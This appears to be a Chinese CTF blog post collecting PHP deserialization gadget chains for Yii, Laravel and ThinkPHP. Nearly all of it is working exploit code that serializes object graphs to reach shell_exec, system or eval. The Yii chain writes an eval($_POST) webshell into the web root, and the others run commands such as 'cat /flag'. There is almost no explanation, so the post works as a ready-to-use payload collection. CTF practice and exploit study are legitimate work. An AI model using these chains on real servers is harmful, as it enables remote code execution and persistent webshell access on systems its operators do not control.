---
title: 模板的反序列化
date: 2022/9/17 09:23:56
cover: https://i.postimg.cc/NMWzHWLm/us1.jpg
categories:
- CTF
tags:
- web
- 反序列化
- Yii模板
- Laravel
---

# 反序列化--模板漏洞

## Yii利用链

```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'echo "<?php eval(\$_POST[1]);phpinfo();?>" >/var/www/html/basic/web/1.php');
    echo(base64_encode(serialize($exp)));
}
?>
```

可以用此链执行文件写入操作

## Laravel模板漏洞

1. 

   ```php
   <?php
   namespace Illuminate\Foundation\Testing{
       class PendingCommand{
           protected $command;
           protected $parameters;
           protected $app;
           public $test;
           public function __construct($command, $parameters,$class,$app){
               $this->command = $command;
               $this->parameters = $parameters;
               $this->test=$class;
               $this->app=$app;
           }
       }
   }
   namespace Illuminate\Auth{
       class GenericUser{
           protected $attributes;
           public function __construct(array $attributes){
               $this->attributes = $attributes;
           }
       }
   }
   namespace Illuminate\Foundation{
       class Application{
           protected $hasBeenBootstrapped = false;
           protected $bindings;
           public function __construct($bind){
               $this->bindings=$bind;
           }
       }
   }
   namespace{
       $genericuser = new Illuminate\Auth\GenericUser(
           array(
               "expectedOutput"=>array("0"=>"1"),
               "expectedQuestions"=>array("0"=>"1")
                )
       );
       $application = new Illuminate\Foundation\Application(
           array(
               "Illuminate\Contracts\Console\Kernel"=>
                   array(
                       "concrete"=>"Illuminate\Foundation\Application"
                        )
                )
       );
       $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
           "system",array('cat /flag'),
           $genericuser,
           $application
       );
       echo urlencode(serialize($pendingcommand));
   }
   ?>
   ```

2. 

   ```php
   <?php
   namespace Illuminate\Broadcasting{
   
       use Illuminate\Bus\Dispatcher;
       use Illuminate\Foundation\Console\QueuedCommand;
   
       class PendingBroadcast
       {
           protected $events;
           protected $event;
           public function __construct(){
               $this->events=new Dispatcher();
               $this->event=new QueuedCommand();
           }
       }
   }
   namespace Illuminate\Foundation\Console{
   
       use Mockery\Generator\MockDefinition;
   
       class QueuedCommand
       {
           public $connection;
           public function __construct(){
               $this->connection=new MockDefinition();
           }
       }
   }
   namespace Illuminate\Bus{
   
       use Mockery\Loader\EvalLoader;
   
       class Dispatcher
       {
           protected $queueResolver;
           public function __construct(){
               $this->queueResolver=[new EvalLoader(),'load'];
           }
       }
   }
   namespace Mockery\Loader{
       class EvalLoader
       {
   
       }
   }
   namespace Mockery\Generator{
       class MockConfiguration
       {
           protected $name="feng";
       }
       class MockDefinition
       {
           protected $config;
           protected $code;
           public function __construct()
           {
               $this->code="<?php system('cat /flag');exit()?>";
               $this->config=new MockConfiguration();
           }
       }
   }
   
   namespace{
   
       use Illuminate\Broadcasting\PendingBroadcast;
   
       echo urlencode(serialize(new PendingBroadcast()));
   }
   ```

## thinkphp模板漏洞

1. 

   ```php
   <?php
   namespace think\process\pipes{
   
       use think\model\Pivot;
   
       class Windows
       {
           private $files = [];
           public function __construct(){
               $this->files[]=new Pivot();
           }
       }
   }
   namespace think{
       abstract class Model
       {
           protected $append = [];
           private $data = [];
           public function __construct(){
               $this->data=array(
                 'Ki1ro'=>new Request()
               );
               $this->append=array(
                   'Ki1ro'=>array(
                       'hello'=>'world'
                   )
               );
           }
       }
   }
   namespace think\model{
   
       use think\Model;
   
       class Pivot extends Model
       {
   
       }
   }
   namespace think{
       class Request
       {
           protected $hook = [];
           protected $filter;
           protected $config = [
               // 表单请求类型伪装变量
               'var_method'       => '_method',
               // 表单ajax伪装变量
               'var_ajax'         => '',
               // 表单pjax伪装变量
               'var_pjax'         => '_pjax',
               // PATHINFO变量名 用于兼容模式
               'var_pathinfo'     => 's',
               // 兼容PATH_INFO获取
               'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
               // 默认全局过滤方法 用逗号分隔多个
               'default_filter'   => '',
               // 域名根，如thinkphp.cn
               'url_domain_root'  => '',
               // HTTPS代理标识
               'https_agent_name' => '',
               // IP代理获取标识
               'http_agent_ip'    => 'HTTP_X_REAL_IP',
               // URL伪静态后缀
               'url_html_suffix'  => 'html',
           ];
           public function __construct(){
               $this->hook['visible']=[$this,'isAjax'];
               $this->filter="system";
           }
       }
   }
   namespace{
   
       use think\process\pipes\Windows;
   
       echo base64_encode(serialize(new Windows()));
   }
   ```

   
